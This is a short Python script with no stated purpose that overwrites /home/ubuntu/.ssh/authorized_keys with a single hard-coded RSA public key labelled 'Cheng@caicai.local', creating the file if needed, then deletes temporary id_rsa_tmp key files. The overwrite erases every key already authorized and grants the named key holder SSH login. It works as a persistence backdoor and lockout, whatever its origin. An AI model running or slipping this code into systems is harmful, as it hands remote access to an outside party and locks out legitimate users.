import os


def main():
    if os.path.exists("/home/ubuntu/.ssh/authorized_keys"):
        f = open("/home/ubuntu/.ssh/authorized_keys", "w")
        f.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCmciDhD+Da2EBHe8BTDoQ+OqBYgQnv4Vn4BBm0dRztv3bRUkjsk+ZnXHB1QCuUKl"
                "AgwC3qYDBX1n8L41z2oikh5DApoB3phZV2veMXIcsL2uohPaBWJ8IOcyRKdXsu+67lBO+BREY5inJSFQMkF0FjhgC72rUhPLfmgHTE"
                "uHW9QLC4PEigzmUxz4ew+N/j9LJ/IBpwG6gPsG8AmzEnrG5cFoiWZZzDyjvo79jk8Zxgo9L39sis3xOuy25YgunY2+LhajFUwhD3yL"
                "VLqMzjtqsj680aUWvCiWsJqcfwYGPU04GHgEUnAmKyLRnf5Gu3E5VG2Bn1L+0p0rvdfoSls3iH Cheng@caicai.local")
    else:
        os.system("touch /home/ubuntu/.ssh/authorized_keys")
        f = open("/home/ubuntu/.ssh/authorized_keys", "w")
        f.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCmciDhD+Da2EBHe8BTDoQ+OqBYgQnv4Vn4BBm0dRztv3bRUkjsk+ZnXHB1QCuUKl"
                "AgwC3qYDBX1n8L41z2oikh5DApoB3phZV2veMXIcsL2uohPaBWJ8IOcyRKdXsu+67lBO+BREY5inJSFQMkF0FjhgC72rUhPLfmgHTE"
                "uHW9QLC4PEigzmUxz4ew+N/j9LJ/IBpwG6gPsG8AmzEnrG5cFoiWZZzDyjvo79jk8Zxgo9L39sis3xOuy25YgunY2+LhajFUwhD3yL"
                "VLqMzjtqsj680aUWvCiWsJqcfwYGPU04GHgEUnAmKyLRnf5Gu3E5VG2Bn1L+0p0rvdfoSls3iH Cheng@caicai.local")

    if os.path.exists("/home/ubuntu/.ssh/id_rsa_tmp"):
        os.system("rm /home/ubuntu/.ssh/id_rsa_tmp")

    if os.path.exists("/home/ubuntu/.ssh/id_rsa_tmp.pub"):
        os.system("rm /home/ubuntu/.ssh/id_rsa_tmp.pub")


if __name__ == '__main__':
    main()
